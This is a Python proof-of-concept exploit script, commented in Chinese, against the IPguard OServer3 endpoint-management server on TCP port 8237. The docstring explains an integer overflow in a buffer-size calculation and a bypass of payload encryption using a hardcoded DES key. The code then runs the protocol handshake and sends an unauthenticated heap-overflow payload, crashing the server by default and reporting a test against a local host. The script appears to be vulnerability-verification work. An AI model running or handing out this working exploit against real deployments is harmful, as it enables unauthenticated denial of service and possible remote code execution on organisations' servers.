#!/usr/bin/env python3
"""
VULN-02 漏洞验证脚本：IPguard OServer3 CMD_DATA 堆溢出 (未授权远程代码执行)

目标：OServer3_x64.exe，TCP端口8237 (OCP协议)
危害：未认证堆溢出 → 服务器崩溃 (拒绝服务) / 潜在远程代码执行
根本原因：AgentDisposal.cpp 中 sub_1400A0EE0 函数存在整数溢出
  分配大小计算：alloc_size = (uint32)(2*(v116 + v117 + v118) + 30)
  当 v116=0x7FFFFFFF 时 → alloc_size 溢出为28字节
  后续宽字符复制循环向28字节堆缓冲区写入无限制数据，造成溢出

加密绕过：OCP解析器(sub_140E32C70)在以下条件下跳过解密
  数据包标志位中两个加密标志(0x4000, 0x0100)均为0时
  发送标志位=0x0001(仅bit0=1)的数据包，可绕过复杂的载荷加密
  (DES-CBC加密，使用头部派生密钥+16字节初始向量)

攻击流程：
  1. 建立连接 → 接收 CMD_HELLO(0x3039)
  2. 发送 CMD_VERSION(0x6010, 版本=1) → 接收 CMD_WAIT(0x6009)
  3. 接收 CMD_READY(0x6000)
  4. 发送 CMD_WANT_TALK(0x6001, bit0=0)
  5. 接收服务器初始化数据包(从连接+392偏移收集代理ID)
  6. 发送 CMD_DATA(0x6700, bit0=1, 无加密)溢出载荷
     使用初始化数据包的代理ID → 触发堆溢出 → 服务器崩溃

测试时间：2026-03-31 针对 192.168.2.130:8237 的 OServer3_x64.exe
测试结果：服务器进程崩溃，被OGuard3.exe看门狗程序自动重启
"""
import socket, struct, sys, time
from Crypto.Cipher import DES

# --- OCP协议常量 ---
MAGIC = 0x4D4F
DES_KEY = b"ocularv3"

CMD_HELLO     = 0x3039
CMD_VERSION   = 0x6010
CMD_WAIT      = 0x6009
CMD_READY     = 0x6000
CMD_WANT_TALK = 0x6001
CMD_XFER_DONE = 0x6003
CMD_DATA      = 0x6700
CMD_DATA_ERR  = 0x67F1

# 命令名称映射字典
CMD_NAMES = {
    CMD_HELLO: "HELLO", CMD_VERSION: "VERSION", CMD_WAIT: "WAIT",
    CMD_READY: "READY", CMD_WANT_TALK: "WANT_TALK", CMD_XFER_DONE: "XFER_DONE",
    CMD_DATA: "DATA", CMD_DATA_ERR: "DATA_ERR", 0x6005: "PING",
}


# 获取命令名称
def cmd_name(c):
    return CMD_NAMES.get(c, f"0x{c:04X}")


# --- DES-ECB加密(用于头部8-31字节加密) ---
def des_encrypt(data):
    cipher = DES.new(DES_KEY, DES.MODE_ECB)
    pad = (8 - len(data) % 8) % 8
    return cipher.encrypt(data + b'\x00' * pad)[:len(data)]


# DES-ECB解密
def des_decrypt(data):
    cipher = DES.new(DES_KEY, DES.MODE_ECB)
    pad = (8 - len(data) % 8) % 8
    return cipher.decrypt(data + b'\x00' * pad)[:len(data)]


# --- OCP数据包构造 ---
def build_header(flags, cmd, ver=0, field8=0, aid=0, crc=0, size=0, offset=0, payload_len=0):
    """构建32字节OCP数据包头"""
    return struct.pack('<HHHHIIIIII', MAGIC, flags, cmd, ver,
                       field8, aid, crc, size, offset, payload_len)


def parse_header(raw):
    """将32字节OCP数据包头解析为字典"""
    fields = struct.unpack_from('<HHHHIIIIII', raw, 0)
    return dict(zip(['magic', 'flags', 'cmd', 'version', 'field8',
                     'agent_id', 'crc', 'size', 'offset', 'payload_len'], fields))


def send_encrypted(sock, flags, cmd, payload=b'', **kw):
    """发送带DES-ECB头部加密的OCP数据包(设置DES标志位时生效)"""
    hdr = build_header(flags, cmd, payload_len=len(payload), **kw)
    if flags & 0x4100:
        encrypted = des_encrypt(hdr[8:32] + payload)
        hdr = hdr[:8] + encrypted[:24]
        payload = encrypted[24:]
    sock.sendall(hdr + payload)


def send_plaintext(sock, flags, cmd, payload=b'', **kw):
    """发送无任何加密的OCP数据包(绕过载荷加密)"""
    hdr = build_header(flags, cmd, payload_len=len(payload), **kw)
    sock.sendall(hdr + payload)


def recv_packet(sock, timeout=10):
    """接收并解析一个OCP数据包"""
    sock.settimeout(timeout)
    raw = b''
    while len(raw) < 32:
        chunk = sock.recv(32 - len(raw))
        if not chunk:
            raise ConnectionError("连接已关闭")
        raw += chunk

    flags = struct.unpack_from('<H', raw, 2)[0]
    if flags & 0x4100:
        raw = raw[:8] + des_decrypt(raw[8:32])

    hdr = parse_header(raw)
    payload = b''
    if hdr['payload_len'] > 0:
        while len(payload) < hdr['payload_len']:
            chunk = sock.recv(hdr['payload_len'] - len(payload))
            if not chunk:
                break
            payload += chunk
        if flags & 0x4100:
            payload = des_decrypt(payload)

    return hdr, payload


# --- 漏洞利用主函数 ---
def exploit(host, port, crash=True):
    print(f"[*] VULN-02 漏洞验证：OServer3 CMD_DATA 堆溢出")
    print(f"[*] 目标：{host}:{port}")
    print()

    # 步骤1：连接服务器并接收HELLO包
    sock = socket.create_connection((host, port), 10)
    hdr, _ = recv_packet(sock)
    hello_aid = hdr['agent_id']
    des_enabled = bool(hdr['flags'] & 0x4000)
    enc_flags = 0x0001 | (0x4000 if des_enabled else 0)
    req_flags = 0x4000 if des_enabled else 0
    print(f"[+] 连接成功，HELLO包代理ID={hello_aid}，DES加密={des_enabled}")

    # 步骤2：发送CMD_VERSION(版本=1，无需身份凭证)
    send_encrypted(sock, enc_flags, CMD_VERSION, ver=1, aid=hello_aid)
    print(f"[+] 已发送CMD_VERSION(版本=1)")

    # 等待CMD_WAIT并响应XFER_DONE
    for _ in range(5):
        hdr, _ = recv_packet(sock, 8)
        if hdr['cmd'] == CMD_WAIT:
            send_encrypted(sock, enc_flags, CMD_XFER_DONE, aid=hdr['agent_id'])
            print(f"[+] 收到CMD_WAIT，已发送XFER_DONE")
            break

    # 步骤3：等待CMD_READY(切换到数据传输阶段)
    for _ in range(5):
        hdr, _ = recv_packet(sock, 8)
        if hdr['cmd'] == CMD_READY:
            ready_aid = hdr['agent_id']
            print(f"[+] 收到CMD_READY，代理ID={ready_aid}")
            break

    # 步骤4：发送CMD_WANT_TALK(数据传输路由要求bit0=0)
    send_encrypted(sock, req_flags, CMD_WANT_TALK, aid=ready_aid)
    print(f"[+] 已发送CMD_WANT_TALK(bit0=0)")

    # 步骤5：接收服务器初始化数据包(收集连接+392偏移注册的代理ID)
    init_packets = []
    for _ in range(200):
        try:
            hdr, payload = recv_packet(sock, 5)
            init_packets.append((hdr, payload))
        except (socket.timeout, TimeoutError):
            break
        except ConnectionError:
            break

    if not init_packets:
        print("[-] 错误：未收到任何初始化数据包")
        sock.close()
        return False

    print(f"[+] 已接收{len(init_packets)}个初始化数据包")
    aids = [h['agent_id'] for h, _ in init_packets]
    print(f"[+] 代理ID范围：{min(aids)} - {max(aids)}")

    # 步骤6a：验证CMD_DATA处理函数可访问(安全测试)
    test_aid = init_packets[0][0]['agent_id']
    safe_payload = struct.pack('<III', 1, 0, 1) + b'\x41\x00' * 4 + b'\x00\x00'
    send_plaintext(sock, 0x0001, CMD_DATA, safe_payload, ver=0, aid=test_aid)
    print(f"[*] 已发送安全CMD_DATA(标志=0x0001，无加密) 代理ID={test_aid}")

    try:
        rh, rp = recv_packet(sock, 5)
        if rh['cmd'] == CMD_DATA:
            print(f"[+] CMD_DATA处理函数已访问！收到DATA响应(代理ID={rh['agent_id']})")
        elif rh['cmd'] == CMD_DATA_ERR:
            print(f"[+] CMD_DATA处理函数已访问！收到DATA_ERR响应")
        else:
            print(f"[?] 收到未知响应：{cmd_name(rh['cmd'])}")
    except (socket.timeout, TimeoutError):
        print(f"[-] 等待CMD_DATA响应超时")
    except ConnectionError as e:
        print(f"[-] 连接已关闭：{e}")
        sock.close()
        return False

    if not crash:
        print(f"\n[*] 安全模式：跳过溢出载荷发送")
        sock.close()
        return True

    # 步骤6b：发送溢出载荷(v116=0x7FFFFFFF → 分配28字节，写入超过1KB数据)
    print(f"\n[!] 正在发送溢出载荷...")
    overflow_aid = init_packets[1][0]['agent_id']

    # sub_1400A0EE0函数的载荷结构：
    #   偏移0：双字字段0(=1)
    #   偏移4：双字字段4(=0)
    #   偏移8：双字v116(=0x7FFFFFFF → 分配大小计算时整数溢出)
    #   偏移12+：宽字符字符串(无边界检查复制 → 堆溢出)
    overflow_payload = struct.pack('<III', 1, 0, 0x7FFFFFFF)
    overflow_payload += b'\x41\x00' * 512  # 1024字节宽字符格式的'A'
    overflow_payload += b'\x00\x00'         # 字符串结束符

    send_plaintext(sock, 0x0001, CMD_DATA, overflow_payload, ver=0, aid=overflow_aid)
    print(f"[!] 已发送CMD_DATA溢出包：v116=0x7FFFFFFF，载荷长度={len(overflow_payload)}字节")

    # 检查执行结果
    time.sleep(1)
    try:
        rh, rp = recv_packet(sock, 3)
        print(f"[?] 收到响应：{cmd_name(rh['cmd'])} (服务器未崩溃？)")
    except (socket.timeout, TimeoutError):
        print(f"[?] 超时(服务器可能正在处理)")
    except (ConnectionError, OSError) as e:
        print(f"[+] 连接被强制关闭：{e}")

    sock.close()

    # 验证服务器是否崩溃
    time.sleep(2)
    try:
        s2 = socket.create_connection((host, port), 5)
        h2, _ = recv_packet(s2, 3)
        print(f"[*] 服务器正常运行(看门狗已自动重启)")
        s2.close()
    except Exception:
        print(f"[!!!] 服务器已下线 - 崩溃确认！")

    return True


if __name__ == '__main__':
    host = sys.argv[1] if len(sys.argv) > 1 else '192.168.2.130'
    port = int(sys.argv[2]) if len(sys.argv) > 2 else 8237
    mode = sys.argv[3] if len(sys.argv) > 3 else 'crash'

    exploit(host, port, crash=(mode != 'safe'))